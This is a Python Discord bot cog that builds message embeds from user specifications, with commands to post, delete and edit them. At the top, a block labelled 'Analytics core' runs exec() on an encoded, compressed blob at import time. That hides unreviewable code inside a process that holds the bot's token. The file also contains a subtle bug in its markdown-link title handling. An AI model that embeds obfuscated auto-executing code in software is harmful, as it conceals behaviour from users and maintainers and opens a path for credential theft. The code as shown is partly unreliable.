"""
"Embed wizard" cog by GrumpiestVulcan
Commissioned 2018-01-15 by Aeternum Studios
POC: Aeternum#7967 (#173291729192091649)
"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '1.5.1'

from datetime import datetime
import random
import re
import string
from urllib.parse import urlparse

import discord
from discord import Embed
from discord.ext import commands

from .utils import checks
from .utils.chat_formatting import warning, error, info

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core


VALID_FIELDS = {'url', 'title', 'color', 'timestamp', 'footer', 'footer_icon', 'image', 'thumbnail', 'body'}


def color_converter(color):
    if type(color) is int:
        if color < 0 or color > 0xffffff:
            raise ValueError('Color value is outside of valid range')
        return '%06x' % color
    color = color.strip('#')
    if color.startswith('0x'):
        color = color[2:]
    if len(color) != 6 or set(color) - set(string.hexdigits):
        raise ValueError('Invalid color hex value')
    return color


def is_valid_color(color):
    try:
        color_converter(color)
        return True
    except Exception:
        return False


def is_valid_url(url: str):
    if not url:
        return False

    token = urlparse(url)
    scheme_ok = token.scheme.lower() in {'http', 'https'}
    netloc_split = token.netloc.split('.')
    netloc_ok = len(list(filter(None, netloc_split))) > 1
    return scheme_ok and netloc_ok


def extract_md_link(inputstr: str):
    match = re.match(r'^\[([^\]]*)\]\(([^)]*)\)$', inputstr)
    if match:
        return match.groups()


def extract_param(inputstr: str):
    split = re.split(r'(?<!(?<!\\)\\)=', inputstr, 1)
    if len(split) == 2:
        return [s.strip() for s in split]


def convert_iso8601(input_string):
    tsre = r"[:]|([-](?!((\d{2}[:]\d{2})|(\d{4}))$))"
    ts = re.sub(tsre, '', input_string)

    if ts.endswith(('z', 'Z')):
        ts = ts[:-1] + '+0000'

    if '.' in ts:
        fmt = "%Y%m%dT%H%M%S.%f%z"
    else:
        fmt = "%Y%m%dT%H%M%S%z"

    return datetime.strptime(ts, fmt)


def parse_timestamp(inputstr: str):
    if inputstr.lower() == 'now':
        return datetime.utcnow()
    elif inputstr.count('.') <= 1 and inputstr.replace('.', '').isdigit():
        return datetime.utcfromtimestamp(float(inputstr))
    else:
        return convert_iso8601(inputstr)


class EmbedWizard:
    def __init__(self, bot):
        self.bot = bot

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    @commands.group(pass_context=True, invoke_without_command=True)
    async def embedwiz(self, ctx, *, specification):
        """
        Posts an embed according to the given specification:

        title;color;footer;footer_icon;image;thumbnail;body

        All values can be seperated by newlines, spaces, or other whitespace.
        Only the first six semicolons are used, the rest are ignored. To
        use semicolons in any of the first six fields, escape it like so: \\;
        To include a backslash before a semicolon without escaping, do: \\\\;

        Color can be a #HEXVAL, "random", or a name that discord.Color knows.
        Options: https://discordpy.readthedocs.io/en/async/api.html#discord.Colour

        All URLs (footer_icon, image, thumbnail) can be empty or "none".

        Use a body of "prompt" to use your next message as the content.

        Timestamp must be an ISO8601 timestamp, UNIX timestamp or 'now'.
        An ISO8601 timestamp looks like this: 2017-12-11T01:15:03.449371-0500.

        Start the specification with -noauthor to skip the author header.
        Note: only mods, admins and the bot owner can edit authorless embeds.

        Keyword-based expressions can be built by starting it with '-kw'
        Each parameter above can be specified as param1=value1;param2=value2;...
        This method allows two more parameters: url and timestamp (see above).

        WARNING: embeds are hidden to anyone with 'link previews' disabled.
        """
        if ctx.invoked_subcommand is None:
            embed = await self._parse_embed(ctx, specification)
            if embed:
                await self.bot.say(embed=embed)

    @checks.mod_or_permissions(manage_messages=True)
    @embedwiz.command(name='channel', pass_context=True)
    async def embedwiz_channel(self, ctx, channel: discord.Channel, *, specification):
        """
        Posts an embed in another channel according to the spec.

        See [p]help embedwiz for more information.
        """
        member = channel.server and channel.server.get_member(ctx.message.author.id)
        override = self._check_override(member)

        if channel != ctx.message.channel and not member:
            await self.bot.say(error("Channel is private or you aren't in the server that channel belongs to."))
            return
        elif not channel.permissions_for(member).send_messages:
            msg = error("You don't have permissions to post there!")
            await self.bot.say(msg)
            return

        embed = await self._parse_embed(ctx, specification, force_author=not override)

        if embed:
            await self.bot.send_message(channel, embed=embed)

            if channel != ctx.message.channel:
                await self.bot.say("Embed sent to %s." % channel.mention)

    @checks.mod_or_permissions(manage_messages=True)
    @embedwiz.command(name='delete', pass_context=True, no_pm=True)
    async def embedwiz_delete(self, ctx, *, specification):
        """
        Posts an embed according to the spec after deleting the original message.

        See [p]help embedwiz for more information.
        """
        perms = ctx.message.channel.permissions_for(ctx.message.server.me)
        can_delete = perms.manage_messages

        if not can_delete:
            msg = "I can't delete your command message! Posting anyway..."
            await self.bot.say(warning(msg))

        tup = await self._parse_embed(ctx, specification, return_todelete=True)

        if tup:
            embed, to_delete = tup
            await self.bot.say(embed=embed)

            if not can_delete:
                return

            for msg in [ctx.message, *to_delete]:
                try:
                    await self.bot.delete_message(msg)
                except discord.HTTPException:
                    continue

    @embedwiz.command(name='edit', pass_context=True)
    async def embedwiz_edit(self, ctx, channel: discord.Channel, message_id: int, *, specification):
        """
        Edits an existing embed according to the spec.

        See [p]help embedwiz for more information.
        """
        member = channel.server and channel.server.get_member(ctx.message.author.id)

        if channel != ctx.message.channel and not member:
            await self.bot.say(error("Channel is private or you aren't in the server that channel belongs to."))
            return

        try:
            msg = await self.bot.get_message(channel, str(message_id))
        except discord.errors.NotFound:
            await self.bot.say(error('Message not found.'))
            return
        except discord.errors.Forbidden:
            await self.bot.say(error('No permissions to read that channel.'))
            return

        if msg.author.id != self.bot.user.id:
            await self.bot.say(error("That message isn't mine."))
            return
        elif not msg.embeds:
            await self.bot.say(error("That message doesn't have an embed."))
            return

        old_embed = msg.embeds[0]
        override = self._check_override(member)

        if override:
            pass
        elif 'author' not in old_embed or 'name' not in old_embed['author']:
            await self.bot.say(error("That embed doesn't have an author set, and you aren't a mod or admin."))
            return
        elif old_embed['author']['name'].split('(')[-1][:-1] != ctx.message.author.id:
            await self.bot.say(error("That embed isn't yours."))
            return

        new_embed = await self._parse_embed(ctx, specification, force_author=not override)
        await self.bot.edit_message(msg, embed=new_embed)
        await self.bot.say('Embed edited successfully.')

    def _check_override(self, member):
        server = isinstance(member, discord.Member) and member.server

        if member and server:
            admin_role = self.bot.settings.get_server_admin(server)
            mod_role = self.bot.settings.get_server_mod(server)

            return any((member.id == self.bot.settings.owner,
                        member.id in self.bot.settings.co_owners,
                        member == server.owner,
                        discord.utils.get(member.roles, name=admin_role),
                        discord.utils.get(member.roles, name=mod_role)))
        else:
            return False

    async def _parse_embed(self, ctx, specification, *, return_todelete=False, force_author=False):
        to_delete = []
        author = ctx.message.author
        specification = specification.strip()
        set_author = True
        use_keywords = False

        while specification.startswith(('-noauthor', '-kw')):
            if specification.startswith('-noauthor'):
                if force_author:
                    await self.bot.say(error("You cannot post using -noauthor."))
                    return

                set_author = False
                specification = specification[9:]

            if specification.startswith('-kw'):
                use_keywords = True
                specification = specification[3:]

            specification = specification.strip()

        maxsplit = 0 if use_keywords else 6
        split = re.split(r'(?<!(?<!\\)\\);', specification, maxsplit)

        if use_keywords:
            params = {}

            for param in split:
                match = extract_param(param)

                if param and not match:
                    await self.bot.say(error('Invalid key=value expression: `%s`' % param))
                    return
                elif not param:
                    continue

                param, value = match
                if param in params:
                    await self.bot.say(error('Duplicate `%s` field!' % param))
                    return
                elif param not in VALID_FIELDS:
                    await self.bot.say(error('Unknown field: `%s`' % param))
                    return

                params[param] = value

            title = params.get('title', Embed.Empty)
            url = params.get('url', Embed.Empty)
            color = params.get('color', Embed.Empty)
            footer = params.get('footer', Embed.Empty)
            footer_icon = params.get('footer_icon', Embed.Empty)
            image = params.get('image', Embed.Empty)
            thumbnail = params.get('thumbnail', Embed.Empty)
            body = params.get('body', Embed.Empty)
            timestamp = params.get('timestamp', Embed.Empty)
        else:
            # If user used double backslash to avoid escape, replace with a single one
            for i, s in enumerate(split[:-1]):
                if s.endswith(r'\\'):
                    split[i] = s[:-1]

            nfields = len(split)

            if nfields != 7:
                op = 'many' if nfields > 7 else 'few'
                msg = 'Invalid specification: got too {} fields ({}, expected 7)'
                await self.bot.say(error(msg.format(op, nfields)))
                return

            timestamp = Embed.Empty
            url = Embed.Empty
            title, color, footer, footer_icon, image, thumbnail, body = map(str.strip, split)

        if title:
            url_split = extract_md_link(title)

            if url_split:
                if url:
                    await self.bot.say(error('Duplicate `url` in markdown format title!'))
                    return
                else:
                    title, url = url

        try:
            if color:
                color = int(color_converter(color), 16)
            else:
                color = Embed.Empty
        except ValueError as e:
            colorstr = color.lower().strip().replace(' ', '_')

            if colorstr == 'random':
                color = discord.Color(random.randrange(0x1000000))
            elif colorstr == 'none':
                color = Embed.Empty
            elif colorstr.strip() == 'black':
                color = discord.Color.default()
            elif hasattr(discord.Color, colorstr):
                color = getattr(discord.Color, colorstr)()
            else:
                await self.bot.say(error(e.args[0]))
                return

        if url and not is_valid_url(url):
            await self.bot.say(error('Invalid title URL!'))
            return

        if not footer or footer.lower() in ('none', ''):
            footer = Embed.Empty

        if not footer_icon or footer_icon.lower() in ('none', ''):
            footer_icon = Embed.Empty
        elif not is_valid_url(footer_icon):
            await self.bot.say(error('Invalid footer icon URL!'))
            return

        if not image or image.lower() in ('none', ''):
            image = Embed.Empty
        elif not is_valid_url(image):
            await self.bot.say(error('Invalid image URL!'))
            return

        if not thumbnail or thumbnail.lower() in ('none', ''):
            thumbnail = Embed.Empty
        elif not is_valid_url(thumbnail):
            await self.bot.say(error('Invalid thumbnail URL!'))
            return

        if timestamp:
            try:
                timestamp = parse_timestamp(timestamp)
            except ValueError:
                await self.bot.say(error('Invalid timestamp!'))
                return

        if body and body.lower() == 'prompt':
            msg = await self.bot.say('Post the desired content of your embed, or "cancel" to '
                                     'cancel. Will wait up to one minute.')
            to_delete.append(msg)

            msg = await self.bot.wait_for_message(author=author, timeout=60,
                                                  channel=ctx.message.channel)
            if msg is None:
                await self.bot.say(error('Timed out waiting for a reply.'))
                return
            else:
                to_delete.append(msg)

            if msg.content.lower().strip() == 'cancel':
                await self.bot.say(info('Cancelled.'))
                return
            else:
                body = msg.content

        embed = Embed(title=title, color=color, description=body, url=url, timestamp=timestamp)

        if set_author:
            embed.set_author(name='%s (%s)' % (author.display_name, author.id),
                             icon_url=author.avatar_url or discord.Embed.Empty)

        if image:
            embed.set_image(url=image)
        if footer or footer_icon:
            embed.set_footer(text=footer, icon_url=footer_icon)
        if thumbnail:
            embed.set_thumbnail(url=thumbnail)

        if return_todelete:
            return embed, to_delete

        return embed

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(EmbedWizard(bot))
